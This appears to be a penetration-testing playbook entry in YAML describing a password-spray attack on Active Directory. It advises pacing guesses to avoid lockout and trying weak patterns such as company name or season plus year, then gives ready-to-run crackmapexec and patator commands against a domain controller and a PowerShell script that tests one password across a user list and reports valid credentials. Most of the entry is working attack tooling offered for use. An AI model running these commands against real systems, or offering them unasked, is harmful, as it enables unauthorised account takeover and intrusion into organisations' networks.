title: Password Spray
category: 
  - AD:
    - Account Review
tactic: Initial Access
tags: []
description:
  - title: 
    content: Run a password spray attack (alilgn with the current password policy, usually one attempt per hour is ok). 
      Check for the most common passwords like companyname+year, month_name+year, season_name+year.
      It also worth checking username as a user's password (username:username)

steps:
  - description: Run the password spray attack.
    options: 
      - tool: crackmapexec
        usage: crackmapexec smb <DC_IP> -u ad_users.txt -p 'April2022' --continue-on-success
        comments:

      - tool: patator
        usage: patator smb_login host=<DC_IP> user=FILE0 password='April2022' 0=ad_users.txt -x ignore:code=c000006d
        comments:

      - tool: powershell
        usage: |
          $domain = "<domain_name>"
          $userList = Get-Content -Path "C:\Temp\ad_users.txt"
          $password = "April2022"

          # Load the required .NET assembly
          Add-Type -AssemblyName System.DirectoryServices.AccountManagement

          # Define the function to validate credentials
          Function Test-Credentials($userName, $password) {
              $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
              Return $pc.ValidateCredentials($userName, $password)
          }

          # Iterate through the user list
          ForEach ($user in $userList) {
              $isValid = Test-Credentials -userName $user -password $password
              If ($isValid) {
                  Write-Host "[$user] - Valid password: $password"
              } Else {
                  Write-Host "[$user] - Invalid password: $password"
              }
          }
        comments:

comments:
  